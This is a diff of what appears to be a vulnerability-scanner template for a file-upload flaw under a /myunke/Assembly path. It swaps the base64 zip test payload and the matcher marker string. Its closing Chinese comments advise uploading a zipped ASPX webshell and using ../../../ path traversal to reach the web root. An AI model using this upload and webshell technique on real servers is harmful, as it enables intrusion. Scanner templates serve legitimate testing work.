@@ -23,7 +23,7 @@ http:
       Accept-Encoding: gzip
       User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
 
-      {{base64_decode("UEsDBBQAAAAAANBIEFfqGiR5BAAAAAQAAAAIAAAAY252ZC50eHRjbnZkUEsBAhQAFAAAAAAA0EgQV+oaJHkEAAAABAAAAAgAJAAAAAAAAAAgAAAAAAAAAGNudmQudHh0CgAgAAAAAAABABgANF6o5N3P2QE0Xqjk3c/ZAaEO3d7dz9kBUEsFBgAAAAABAAEAWgAAACoAAAAAAA==")}}
+      {{base64_decode("UEsDBAoAAAAAAOZ4Llcg8UFMHAAAABwAAAAIABwAY252ZC50eHRVVAkAAx+xAmUhsQJldXgLAAEE9gEAAAQUAAAAZDY3MjM4Z2hkOHVpcW5kNzhld3FnZDY3ODIzClBLAQIeAwoAAAAAAOZ4Llcg8UFMHAAAABwAAAAIABgAAAAAAAEAAACkgQAAAABjbnZkLnR4dFVUBQADH7ECZXV4CwABBPYBAAAEFAAAAFBLBQYAAAAAAQABAE4AAABeAAAAAAA=")}}
 
     - |
       GET /myunke/Assembly/{{v1}}/cnvd.txt HTTP/1.1
@@ -35,7 +35,7 @@ http:
     matchers:
       - type: dsl
         dsl:
-          - "status_code_2 == 200 && contains(body_2,'cnvd')"
+          - "status_code_2 == 200 && contains(body_2,'d67238ghd8uiqnd78ewqgd67823')"
 
 # 1、如果漏洞存在，用zip压缩一个shell.aspx文件，内容为aspx马子，重新上传即可
 # 2、如果在第一步的基础上访问马子发现并未解析或者403，这种情况需要将马子跨目录上传，跨三层 ../../../ 即可到Web根目录，../../../fdccloud/ 则是跨到Web根目录下的fdccloud目录
